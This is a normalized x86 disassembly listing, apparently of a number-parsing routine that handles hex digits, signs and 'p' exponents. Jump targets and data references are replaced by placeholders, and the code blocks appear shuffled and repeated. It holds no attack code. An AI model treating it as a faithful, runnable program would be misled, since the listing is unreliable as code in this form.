jmp r-xdata
mov dx [ ebp - 0x64 ]
cmp [ ebx + 0x6 ] dx
jne r-xdata
mov ecx [ ebx ]
test ecx ecx
je r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x58 ]
mov [ eax ] 0x2b
mov ecx [ ebx ]
inc eax
mov [ ebp - 0x58 ] eax
test ecx ecx
je r-xdata
mov [ ebx ] 0x0
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
mov edi [ ebp - 0x60 ]
mov esi ebx
mov [ ebp - 0x4c ] 0x0
mov [ ebp - 0x6c ] 0x0
call sub_41f260
test al al
jne r-xdata
mov ecx 0xffff
cmp cx ax
je r-xdata
mov [ ebx + 0x6 ] ax
jmp r-xdata
mov eax [ eax ]
movzx eax [ eax ]
jmp r-xdata
mov [ ebx + 0x4 ] 0x0
jmp r-xdata
mov eax edx
dec [ eax ]
mov ecx [ ecx + 0x20 ]
mov eax [ ecx ]
lea edx [ eax + 0x2 ]
mov [ ecx ] edx
movzx eax [ eax ]
jmp r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x18 ]
call eax
movzx eax ax
mov edx [ ecx + 0x30 ]
cmp [ edx ] 0x0
jle r-xdata
inc [ eax + ecx ]
jmp r-xdata
lea eax [ ebp - 0x2c ]
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
cmp [ ebp - 0x4c ] 0x0
je r-xdata
mov ecx [ ebx ]
mov [ ebp - 0x4c ] 0x1
test ecx ecx
je r-xdata
mov [ ebx ] 0x0
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
movzx esi [ ebx + 0x6 ]
push edi
xor eax eax
lea edx [ ebp - 0x74 ]
push edx
mov [ ebp - 0x5c ] eax
mov [ ebp - 0x74 ] eax
push 0x1
lea eax [ ebp - 0x50 ]
push eax
lea ecx [ ebp - 0x5c ]
push ecx
mov [ ebp - 0x50 ] 0x2d
call sub_43640d
add esp 0x14
cmp si [ ebp - 0x5c ]
jne r-xdata
mov ecx [ ebx ]
test ecx ecx
je r-xdata
mov [ ebx + 0x4 ] 0x1
mov [ ebx ] 0x0
mov edx [ ecx + 0x20 ]
cmp [ edx ] 0x0
je r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x18 ]
call eax
movzx eax ax
mov edx [ ecx + 0x30 ]
cmp [ edx ] 0x0
jle r-xdata
mov [ ebx + 0x4 ] 0x1
movzx eax ax
mov ecx 0xffff
cmp cx ax
je r-xdata
mov edi [ ebp - 0x60 ]
mov esi ebx
call sub_41f260
test al al
je r-xdata
mov ecx 0xffff
cmp cx ax
je r-xdata
mov [ ebx + 0x6 ] ax
jmp r-xdata
mov eax [ eax ]
movzx eax [ eax ]
jmp r-xdata
mov dx [ ebp - 0x64 ]
cmp dx [ ebx + 0x6 ]
ja r-xdata
mov ecx [ ebx ]
test ecx ecx
je r-xdata
mov eax [ ebp - 0x58 ]
mov [ eax ] 0x30
inc eax
mov [ ebp - 0x58 ] eax
mov [ ebx ] 0x0
mov [ ebx + 0x4 ] 0x1
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x18 ]
call eax
movzx eax ax
mov edx [ ecx + 0x30 ]
cmp [ edx ] 0x0
jle r-xdata
mov eax [ ebp - 0x58 ]
mov [ eax ] 0x2d
mov ecx [ ebx ]
inc eax
mov [ ebp - 0x58 ] eax
test ecx ecx
je r-xdata
mov [ ebx ] 0x0
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ecx ]
mov edx [ eax + 0x1c ]
call edx
movzx eax ax
mov eax [ ecx + 0x30 ]
cmp [ eax ] 0x0
jle r-xdata
mov [ ebx + 0x6 ] ax
jmp r-xdata
mov eax [ eax ]
movzx eax [ eax ]
jmp r-xdata
mov [ ebx + 0x4 ] 0x1
movzx eax ax
mov ecx 0xffff
cmp cx ax
je r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
mov [ ebx ] 0x0
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
jmp r-xdata
mov eax [ ecx ]
mov edx [ eax + 0x1c ]
call edx
movzx eax ax
mov edx [ ecx + 0x30 ]
cmp [ edx ] 0x0
jle r-xdata
mov [ ebx + 0x6 ] ax
jmp r-xdata
mov eax [ eax ]
movzx eax [ eax ]
jmp r-xdata
mov edx [ ecx + 0x20 ]
cmp [ edx ] 0x0
je r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x18 ]
call eax
movzx eax ax
mov edx [ ecx + 0x30 ]
cmp [ edx ] 0x0
jle r-xdata
mov [ ebx + 0x4 ] 0x0
jmp r-xdata
dec [ eax ]
mov ecx [ ecx + 0x20 ]
mov eax [ ecx ]
lea edx [ eax + 0x2 ]
mov [ ecx ] edx
movzx eax [ eax ]
jmp r-xdata
mov [ ebx + 0x4 ] 0x1
movzx eax ax
mov ecx 0xffff
cmp cx ax
je r-xdata
movzx edx [ ebp - 0x64 ]
movzx eax [ ebx + 0x6 ]
add edx 0x9
cmp eax edx
jg r-xdata
mov ecx [ ebx ]
test ecx ecx
je r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x18 ]
call eax
movzx eax ax
mov edx [ ecx + 0x30 ]
cmp [ edx ] 0x0
jle r-xdata
mov [ ebx + 0x4 ] 0x0
jmp r-xdata
mov eax edx
dec [ eax ]
mov ecx [ ecx + 0x20 ]
mov eax [ ecx ]
lea edx [ eax + 0x2 ]
mov [ ecx ] edx
movzx eax [ eax ]
jmp r-xdata
mov [ ebx + 0x4 ] 0x1
movzx eax ax
mov ecx 0xffff
cmp cx ax
je r-xdata
mov eax [ ecx + 0x30 ]
cmp [ eax ] 0x0
jle r-xdata
mov [ ebx + 0x6 ] ax
jmp r-xdata
mov eax [ eax ]
movzx eax [ eax ]
jmp r-xdata
mov ecx 0xffff
cmp cx ax
je r-xdata
cmp [ ebp - 0x6c ] 0x8
jge r-xdata
mov [ ebx ] 0x0
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
mov [ ebx + 0x6 ] ax
jmp r-xdata
mov eax [ eax ]
movzx eax [ eax ]
jmp r-xdata
mov edi [ ebp - 0x60 ]
mov esi ebx
call sub_41f260
test al al
je r-xdata
mov ecx 0xffff
cmp cx ax
je r-xdata
dec [ eax ]
mov ecx [ ecx + 0x20 ]
mov eax [ ecx ]
lea edx [ eax + 0x2 ]
mov [ ecx ] edx
movzx eax [ eax ]
jmp r-xdata
mov [ ebx + 0x4 ] 0x1
movzx eax ax
mov ecx 0xffff
cmp cx ax
je r-xdata
mov ecx [ ebx ]
mov [ ebp - 0x4c ] 0x1
test ecx ecx
je r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x18 ]
call eax
movzx eax ax
mov edx [ ecx + 0x30 ]
cmp [ edx ] 0x0
jle r-xdata
mov [ ebx + 0x4 ] 0x1
movzx eax ax
mov ecx 0xffff
cmp cx ax
je r-xdata
mov [ ebx ] 0x0
mov [ ebx + 0x4 ] 0x1
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
mov dl [ ebx + 0x6 ]
sub dl [ ebp - 0x64 ]
mov eax [ ebp - 0x58 ]
add dl 0x30
mov [ eax ] dl
inc eax
inc [ ebp - 0x6c ]
mov [ ebp - 0x58 ] eax
mov ecx [ ebx ]
test ecx ecx
je r-xdata
mov [ ebx + 0x6 ] ax
jmp r-xdata
mov eax [ eax ]
movzx eax [ eax ]
jmp r-xdata
mov eax [ ecx ]
mov edx [ eax + 0x1c ]
call edx
movzx eax ax
mov edx [ ecx + 0x30 ]
cmp [ edx ] 0x0
jle r-xdata
mov [ ebx ] 0x0
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
mov [ ebx + 0x4 ] 0x1
movzx eax ax
mov ecx 0xffff
cmp cx ax
je r-xdata
mov [ ebx + 0x4 ] 0x0
jmp r-xdata
mov eax edx
dec [ eax ]
mov ecx [ ecx + 0x20 ]
mov eax [ ecx ]
lea edx [ eax + 0x2 ]
mov [ ecx ] edx
movzx eax [ eax ]
jmp r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x18 ]
call eax
movzx eax ax
mov edx [ ecx + 0x30 ]
cmp [ edx ] 0x0
jle r-xdata
mov edi [ ebp - 0x60 ]
mov esi ebx
call sub_41f260
test al al
je r-xdata
mov ecx 0xffff
cmp cx ax
je r-xdata
mov [ ebx + 0x6 ] ax
jmp r-xdata
mov eax [ eax ]
movzx eax [ eax ]
jmp r-xdata
mov [ ebx + 0x4 ] 0x1
movzx eax ax
mov ecx 0xffff
cmp cx ax
je r-xdata
sub_41dcd0
push ebp
mov ebp esp
push 0xffffffff
push sub_451518
mov eax [ fs : 0x0 ]
push eax
sub esp 0x84
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x60 ] edx
mov [ ebp - 0x5c ] eax
mov eax [ ebp + 0x10 ]
lea edx [ ebp - 0x78 ]
mov [ ebp - 0x84 ] ecx
mov ecx [ ebp + 0xc ]
push edx
mov [ ebp - 0x8c ] eax
call sub_402e50
mov edi eax
mov [ ebp - 0x4 ] 0x0
call sub_40a480
mov [ ebp - 0x80 ] eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x78 ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x80 ]
lea esi [ ebp - 0x48 ]
call sub_427c60
mov [ ebp - 0x4 ] 0x1
mov esi [ ebp - 0x5c ]
add esi 0x8
push esi
lea eax [ ebp - 0x74 ]
push eax
push 0x1
lea ecx [ ebp - 0x50 ]
push ecx
lea edx [ ebp - 0x6c ]
xor edi edi
push edx
mov [ ebp - 0x50 ] 0x30
mov [ ebp - 0x6c ] edi
mov [ ebp - 0x74 ] edi
mov [ ebp - 0x7c ] esi
call sub_43640d
add esp 0x14
push esi
lea eax [ ebp - 0x5c ]
push eax
push 0x1
lea ecx [ ebp - 0x50 ]
push ecx
lea edx [ ebp - 0x88 ]
push edx
mov [ ebp - 0x50 ] 0x61
mov [ ebp - 0x88 ] edi
mov [ ebp - 0x5c ] edi
call sub_43640d
add esp 0x14
push esi
lea eax [ ebp - 0x5c ]
push eax
push 0x1
lea ecx [ ebp - 0x50 ]
push ecx
lea edx [ ebp - 0x74 ]
push edx
mov [ ebp - 0x50 ] 0x41
mov [ ebp - 0x74 ] edi
mov [ ebp - 0x5c ] edi
call sub_43640d
mov eax [ ebp - 0x84 ]
mov edi [ ebp - 0x60 ]
add esp 0x14
mov esi ebx
mov [ ebp - 0x58 ] eax
mov [ ebp - 0x50 ] 0x0
call sub_41f260
test al al
jne r-xdata
push 0x0
lea ecx [ ebp - 0x74 ]
mov edi eax
call sub_436188
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x58 ]
mov edi [ ebp - 0x60 ]
mov [ eax ] 0x7830
add eax 0x2
mov [ ebp - 0x58 ] eax
xor eax eax
mov esi ebx
mov [ ebp - 0x4c ] 0x0
mov [ ebp - 0x68 ] eax
mov [ ebp - 0x70 ] eax
call sub_41f260
test al al
jne r-xdata
mov ecx [ ebp - 0x7c ]
push ecx
xor eax eax
lea edx [ ebp - 0x5c ]
push edx
mov [ ebp - 0x64 ] eax
mov [ ebp - 0x5c ] eax
push 0x1
lea eax [ ebp - 0x4c ]
push eax
lea ecx [ ebp - 0x64 ]
push ecx
mov [ ebp - 0x4c ] 0x2b
call sub_43640d
movzx edi [ ebp - 0x64 ]
add esp 0x14
call sub_41ec60
cmp ax di
jne r-xdata
mov esi [ edi + 0x4 ]
neg esi
sbb esi esi
lea ecx [ ebp - 0x74 ]
not esi
call sub_4361b0
and esi edi
je r-xdata
cmp eax 0xffffffff
jae r-xdata
mov ecx [ ebp - 0x34 ]
mov edx [ ebp - 0x48 ]
mov eax edx
cmp ecx 0x10
jae r-xdata
call sub_41ec60
cmp ax [ ebp - 0x6c ]
jne r-xdata
mov edx [ ebp - 0x7c ]
xor eax eax
push edx
mov [ ebp - 0x64 ] eax
mov [ ebp - 0x5c ] eax
lea eax [ ebp - 0x5c ]
push eax
push 0x1
lea ecx [ ebp - 0x4c ]
push ecx
lea edx [ ebp - 0x64 ]
push edx
mov [ ebp - 0x4c ] 0x2d
call sub_43640d
movzx edi [ ebp - 0x64 ]
add esp 0x14
mov esi ebx
call sub_41ec60
cmp ax di
jne r-xdata
mov eax [ ebp - 0x84 ]
mov [ eax ] 0x2b
jmp r-xdata
mov eax [ esi ]
mov edx [ eax ]
push 0x1
mov ecx esi
call edx
dec eax
mov [ edi + 0x4 ] eax
cmp [ eax ] 0x7f
je r-xdata
lea eax [ ebp - 0x48 ]
call sub_41ecc0
mov esi eax
call sub_41f260
test al al
jne r-xdata
mov eax [ ebp - 0x84 ]
mov [ eax ] 0x2d
inc eax
mov esi ebx
mov [ ebp - 0x58 ] eax
call sub_41ecc0
mov edi [ ebp - 0x60 ]
mov esi ebx
call sub_41f260
test al al
jne r-xdata
mov eax edx
cmp ecx 0x10
jae r-xdata
mov [ ebp - 0x4c ] 0x1
xor eax eax
mov [ ebp - 0x64 ] eax
mov [ ebp - 0x5c ] eax
mov eax [ ebp - 0x7c ]
push eax
lea ecx [ ebp - 0x5c ]
push ecx
push 0x1
lea edx [ ebp - 0x54 ]
push edx
lea eax [ ebp - 0x64 ]
push eax
mov [ ebp - 0x54 ] 0x78
call sub_43640d
movzx edi [ ebp - 0x64 ]
add esp 0x14
mov esi ebx
call sub_41ec60
cmp ax di
je r-xdata
cmp [ ebp - 0x4c ] 0x0
je r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
cmp [ eax ] 0x0
jle r-xdata
lea eax [ ebp - 0x48 ]
mov esi ebx
call sub_41ecc0
jmp r-xdata
mov ecx [ ebp - 0x7c ]
push ecx
push 0x58
call sub_407340
add esp 0x8
mov di ax
call sub_41ec60
cmp ax di
jne r-xdata
mov edi [ ebp - 0x60 ]
mov esi ebx
call sub_41f260
test al al
jne r-xdata
cmp [ ebp - 0x68 ] 0x0
jne r-xdata
movzx ecx [ ebx + 0x6 ]
mov eax [ ebp - 0x6c ]
cmp ax cx
ja r-xdata
mov ecx [ ebx ]
test ecx ecx
je r-xdata
cmp [ ebp - 0x38 ] 0x0
jne r-xdata
cmp [ ebp - 0x68 ] 0x0
jne r-xdata
cmp [ ebx + 0x4 ] al
jne r-xdata
mov eax [ ebp - 0x58 ]
mov [ eax ] 0x30
inc eax
mov [ ebp - 0x58 ] eax
mov eax [ ebp - 0x88 ]
cmp ax cx
ja r-xdata
movzx edx ax
mov eax ecx
lea esi [ edx + 0x9 ]
cmp eax esi
jg r-xdata
mov [ ebx ] 0x0
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
mov ecx [ ebp - 0x80 ]
mov edx [ ecx ]
mov eax [ edx + 0x8 ]
call eax
movzx ecx ax
mov [ ebp - 0x5c ] ecx
mov [ ebp - 0x5c ] 0x0
jmp r-xdata
mov edi [ ebp - 0x60 ]
mov esi ebx
call sub_41f260
test al al
jne r-xdata
mov esi ebx
call sub_41f260
test al al
jne r-xdata
mov ecx [ ebp - 0x80 ]
mov edx [ ecx ]
mov eax [ edx + 0x4 ]
movzx esi [ ebx + 0x6 ]
call eax
cmp si ax
jne r-xdata
mov ecx [ ebx ]
test ecx ecx
je r-xdata
mov eax [ ebp - 0x74 ]
cmp ax cx
ja r-xdata
movzx edx ax
mov eax ecx
lea esi [ edx + 0x5 ]
cmp eax esi
jle r-xdata
sub eax edx
mov esi eax
jmp r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x18 ]
call eax
movzx eax ax
mov edx [ ecx + 0x30 ]
cmp [ edx ] 0x0
jle r-xdata
cmp [ ebp - 0x34 ] 0x10
mov esi [ ebp - 0x48 ]
jae r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] 0x1
mov [ ebp - 0x2c ] 0x0
mov edi [ ebp - 0x60 ]
mov [ ebp - 0x4 ] 0x2
mov esi ebx
mov [ ebp - 0x64 ] 0x0
call sub_41f260
test al al
jne r-xdata
cmp [ ebp - 0x4c ] 0x0
je r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
cmp [ ebp - 0x70 ] 0x0
jge r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
call sub_438c6d
mov ecx [ eax ]
mov eax [ ebp - 0x58 ]
mov dl [ ecx ]
mov [ eax ] dl
mov ecx [ ebx ]
inc eax
mov [ ebp - 0x58 ] eax
test ecx ecx
je r-xdata
mov [ ebx ] 0x0
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
movzx edx ax
mov eax ecx
lea ecx [ edx + 0x5 ]
cmp eax ecx
jg r-xdata
sub eax edx
lea esi [ eax + 0xa ]
test esi esi
js r-xdata
mov [ ebx + 0x6 ] ax
jmp r-xdata
mov eax [ eax ]
movzx eax [ eax ]
jmp r-xdata
cmp [ ebp - 0x50 ] 0x0
mov edi [ ebp - 0x18 ]
jne r-xdata
lea esi [ ebp - 0x48 ]
movzx ecx [ ebx + 0x6 ]
mov eax [ ebp - 0x6c ]
cmp ax cx
ja r-xdata
mov ecx [ ebx ]
test ecx ecx
je r-xdata
cmp [ ebp - 0x50 ] 0x0
jne r-xdata
mov edi [ ebp - 0x60 ]
mov esi ebx
call sub_41f260
test al al
jne r-xdata
movzx ecx [ ebx + 0x6 ]
mov eax [ ebp - 0x6c ]
cmp ax cx
ja r-xdata
mov ecx [ ebx ]
test ecx ecx
je r-xdata
mov eax [ ebp - 0x58 ]
mov [ eax ] 0x30
inc eax
inc [ ebp - 0x70 ]
mov [ ebp - 0x58 ] eax
mov dx [ ebp - 0x6c ]
cmp [ ebx + 0x6 ] dx
jne r-xdata
mov ecx [ ebx ]
test ecx ecx
je r-xdata
mov [ ebx ] 0x0
mov [ ebx + 0x4 ] 0x1
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x18 ]
call eax
movzx eax ax
mov edx [ ecx + 0x30 ]
cmp [ edx ] 0x0
jle r-xdata
mov edi [ ebp - 0x68 ]
cmp edi 0x24
jl r-xdata
mov [ ebx + 0x4 ] 0x1
movzx eax ax
mov ecx 0xffff
cmp cx ax
je r-xdata
mov [ ebp - 0x4 ] 0x1
cmp edi 0x10
jb r-xdata
mov edx [ ebp - 0x64 ]
mov eax [ ebp - 0x88 ]
cmp ax cx
ja r-xdata
movzx edx ax
mov eax ecx
lea esi [ edx + 0x9 ]
cmp eax esi
jg r-xdata
mov [ ebx ] 0x0
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp - 0x84 ]
jmp r-xdata
cmp [ ebp - 0x4c ] 0x0
jne r-xdata
cmp [ ebx + 0x4 ] al
jne r-xdata
mov eax [ ebp - 0x88 ]
cmp ax cx
ja r-xdata
movzx edx ax
mov eax ecx
lea esi [ edx + 0x9 ]
cmp eax esi
jg r-xdata
mov [ ebx ] 0x0
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
mov ecx [ ebx ]
dec [ ebp - 0x70 ]
mov [ ebp - 0x4c ] 0x1
test ecx ecx
je r-xdata
mov [ ebx ] 0x0
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ecx ]
mov edx [ eax + 0x1c ]
call edx
movzx eax ax
mov edx [ ecx + 0x30 ]
cmp [ edx ] 0x0
jle r-xdata
mov [ ebx + 0x6 ] ax
jmp r-xdata
mov eax [ eax ]
movzx eax [ eax ]
jmp r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
inc [ ebp - 0x70 ]
jmp r-xdata
mov eax [ ebp - 0x2c ]
push eax
call sub_43811c
add esp 0x4
mov cl [ esi ]
cmp cl 0x7f
je r-xdata
mov eax [ ebp - 0x74 ]
cmp ax cx
ja r-xdata
movzx edx ax
mov eax ecx
lea esi [ edx + 0x5 ]
cmp eax esi
jle r-xdata
sub eax edx
mov edi eax
jmp r-xdata
mov eax [ ecx ]
mov edx [ eax + 0x18 ]
call edx
movzx eax ax
mov edx [ ecx + 0x30 ]
cmp [ edx ] 0x0
jle r-xdata
cmp [ ebp - 0x34 ] 0x10
mov edx [ ebp - 0x70 ]
mov [ eax ] 0x0
mov eax [ ebp - 0x8c ]
mov [ eax ] edx
jb r-xdata
mov eax [ ebp - 0x58 ]
mov edi [ ebp - 0x7c ]
movzx esi [ ebx + 0x6 ]
push edi
xor eax eax
lea edx [ ebp - 0x78 ]
push edx
mov [ ebp - 0x5c ] eax
mov [ ebp - 0x78 ] eax
push 0x1
lea eax [ ebp - 0x54 ]
push eax
lea ecx [ ebp - 0x5c ]
push ecx
mov [ ebp - 0x54 ] 0x70
call sub_43640d
add esp 0x14
cmp si [ ebp - 0x5c ]
je r-xdata
mov ecx [ ebx ]
test ecx ecx
je r-xdata
mov eax [ ebp - 0x74 ]
cmp ax cx
ja r-xdata
movzx edx ax
mov eax ecx
lea esi [ edx + 0x5 ]
cmp eax esi
jle r-xdata
sub eax edx
jmp r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x18 ]
call eax
movzx eax ax
mov edx [ ecx + 0x30 ]
cmp [ edx ] 0x0
jle r-xdata
mov [ ebx ] 0x0
mov [ ebx + 0x4 ] 0x1
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x18 ]
call eax
movzx eax ax
mov edx [ ecx + 0x30 ]
cmp [ edx ] 0x0
jle r-xdata
mov [ ebx + 0x4 ] 0x0
jmp r-xdata
mov eax edx
dec [ eax ]
mov ecx [ ecx + 0x20 ]
mov eax [ ecx ]
lea edx [ eax + 0x2 ]
mov [ ecx ] edx
movzx eax [ eax ]
jmp r-xdata
mov [ ebx + 0x4 ] 0x1
movzx eax ax
mov ecx 0xffff
cmp cx ax
je r-xdata
mov dx [ ebp - 0x6c ]
cmp [ ebx + 0x6 ] dx
jne r-xdata
mov ecx [ ebx ]
test ecx ecx
je r-xdata
mov ecx [ ebx ]
mov [ ebp - 0x4c ] 0x1
test ecx ecx
je r-xdata
dec edx
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
movzx edx ax
mov eax ecx
lea ecx [ edx + 0x5 ]
cmp eax ecx
jg r-xdata
sub eax edx
lea edi [ eax + 0xa ]
test edi edi
js r-xdata
mov [ ebx + 0x6 ] ax
jmp r-xdata
mov eax [ eax ]
movzx eax [ eax ]
jmp r-xdata
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_437c1c
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x48 ]
push ecx
call sub_43811c
add esp 0x4
mov eax [ ebp - 0x58 ]
mov [ eax ] 0x70
mov ecx [ ebx ]
inc eax
mov [ ebp - 0x58 ] eax
test ecx ecx
je r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
mov [ ebx ] 0x0
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
movzx edx ax
mov eax ecx
lea ecx [ edx + 0x5 ]
cmp eax ecx
jg r-xdata
sub eax edx
add eax 0xa
test eax eax
js r-xdata
mov [ ebx + 0x6 ] ax
jmp r-xdata
mov eax [ eax ]
movzx eax [ eax ]
jmp r-xdata
mov eax [ ecx ]
mov edx [ eax + 0x1c ]
call edx
movzx eax ax
mov edx [ ecx + 0x30 ]
cmp [ edx ] 0x0
jle r-xdata
mov [ ebx + 0x6 ] ax
jmp r-xdata
mov eax [ eax ]
movzx eax [ eax ]
jmp r-xdata
mov ecx 0xffff
cmp cx ax
je r-xdata
mov eax [ ebp - 0x58 ]
mov cl [ esi + r--data ]
mov [ eax ] cl
inc eax
inc edi
mov [ ebp - 0x58 ] eax
mov [ ebp - 0x68 ] edi
test edi edi
je r-xdata
mov [ ebx ] 0x0
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
mov [ ebx ] 0x0
mov [ ebx + 0x4 ] 0x1
mov edx [ ecx + 0x20 ]
cmp [ edx ] 0x0
je r-xdata
test edx edx
jne r-xdata
mov eax [ ebp - 0x2c ]
cmp edi 0x10
jae r-xdata
mov ecx [ ebp - 0x64 ]
cmp [ eax + ecx ] 0x0
je r-xdata
lea eax [ ebp - 0x2c ]
cmp [ ebp - 0x68 ] 0x24
mov [ ebp - 0x4c ] 0x1
jl r-xdata
mov [ ebx + 0x4 ] 0x1
movzx eax ax
mov ecx 0xffff
cmp cx ax
je r-xdata
mov [ ebx ] 0x0
mov [ ebx + 0x4 ] 0x1
mov edx [ ecx + 0x20 ]
cmp [ edx ] 0x0
je r-xdata
movzx esi [ ebx + 0x6 ]
push edi
xor eax eax
lea edx [ ebp - 0x78 ]
push edx
mov [ ebp - 0x5c ] eax
mov [ ebp - 0x78 ] eax
push 0x1
lea eax [ ebp - 0x54 ]
push eax
lea ecx [ ebp - 0x5c ]
push ecx
mov [ ebp - 0x54 ] 0x50
call sub_43640d
add esp 0x14
cmp si [ ebp - 0x5c ]
jne r-xdata
mov ecx [ ebx ]
test ecx ecx
je r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x18 ]
call eax
movzx eax ax
mov edx [ ecx + 0x30 ]
cmp [ edx ] 0x0
jle r-xdata
cmp [ ebp - 0x68 ] 0x24
jge r-xdata
mov [ ebx + 0x4 ] 0x1
movzx eax ax
mov ecx 0xffff
cmp cx ax
je r-xdata
mov [ ebx + 0x4 ] 0x0
jmp r-xdata
mov eax edx
dec [ eax ]
mov ecx [ ecx + 0x20 ]
mov eax [ ecx ]
lea edx [ eax + 0x2 ]
mov [ ecx ] edx
movzx eax [ eax ]
jmp r-xdata
mov [ ebx + 0x4 ] 0x1
movzx eax ax
mov ecx 0xffff
cmp cx ax
je r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x18 ]
call eax
movzx eax ax
mov edx [ ecx + 0x30 ]
cmp [ edx ] 0x0
jle r-xdata
jmp r-xdata
mov eax [ ecx ]
mov edx [ eax + 0x1c ]
call edx
movzx eax ax
mov eax [ ecx + 0x30 ]
cmp [ eax ] 0x0
jle r-xdata
cmp [ esi + 0x1 ] 0x0
jle r-xdata
mov eax [ ebp - 0x2c ]
cmp edi 0x10
jae r-xdata
cmp cl [ eax + edx ]
jne r-xdata
lea eax [ ebp - 0x2c ]
cmp [ ebp - 0x64 ] 0x0
je r-xdata
mov edi [ ebp - 0x5c ]
test di di
je r-xdata
mov esi ebx
call sub_41ec60
cmp ax [ ebp - 0x6c ]
jne r-xdata
inc [ ebp - 0x70 ]
jmp r-xdata
mov edi [ ebp - 0x60 ]
mov esi ebx
call sub_41f260
test al al
jne r-xdata
cmp [ ebx + 0x4 ] al
jne r-xdata
mov eax [ ecx ]
mov edx [ eax + 0x1c ]
call edx
movzx eax ax
mov eax [ ecx + 0x30 ]
cmp [ eax ] 0x0
jle r-xdata
mov [ ebx ] 0x0
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
mov [ ebx + 0x6 ] ax
jmp r-xdata
mov eax [ eax ]
movzx eax [ eax ]
jmp r-xdata
mov ecx [ ebx ]
mov [ ebp - 0x4c ] 0x1
test ecx ecx
je r-xdata
mov dl [ eax + r--data ]
mov eax [ ebp - 0x58 ]
mov [ eax ] dl
inc eax
inc [ ebp - 0x68 ]
mov [ ebp - 0x58 ] eax
mov edi [ ebp - 0x60 ]
mov esi ebx
call sub_41f260
test al al
je r-xdata
mov ecx 0xffff
cmp cx ax
je r-xdata
mov [ ebx + 0x6 ] ax
jmp r-xdata
mov eax [ eax ]
movzx eax [ eax ]
jmp r-xdata
mov [ ebx + 0x4 ] 0x0
jmp r-xdata
dec [ eax ]
mov ecx [ ecx + 0x20 ]
mov eax [ ecx ]
lea edx [ eax + 0x2 ]
mov [ ecx ] edx
movzx eax [ eax ]
jmp r-xdata
test edx edx
je r-xdata
inc esi
jmp r-xdata
cmp cl [ eax ]
jl r-xdata
lea eax [ ebp - 0x2c ]
mov [ ebp - 0x50 ] 0x1
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
mov esi ebx
call sub_41ec60
cmp ax di
jne r-xdata
mov eax [ ebp - 0x58 ]
mov dl [ edi + r--data ]
mov [ eax ] dl
inc eax
inc [ ebp - 0x68 ]
mov [ ebp - 0x58 ] eax
cmp [ ebp - 0x68 ] 0x0
je r-xdata
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x2c ]
cmp edx 0x10
jae r-xdata
mov edi [ ebp - 0x60 ]
mov esi ebx
call sub_41f260
test al al
jne r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
mov edi [ ebp - 0x7c ]
movzx esi [ ebx + 0x6 ]
push edi
xor eax eax
lea edx [ ebp - 0x78 ]
push edx
mov [ ebp - 0x5c ] eax
mov [ ebp - 0x78 ] eax
push 0x1
lea eax [ ebp - 0x54 ]
push eax
lea ecx [ ebp - 0x5c ]
push ecx
mov [ ebp - 0x54 ] 0x2b
call sub_43640d
add esp 0x14
cmp si [ ebp - 0x5c ]
jne r-xdata
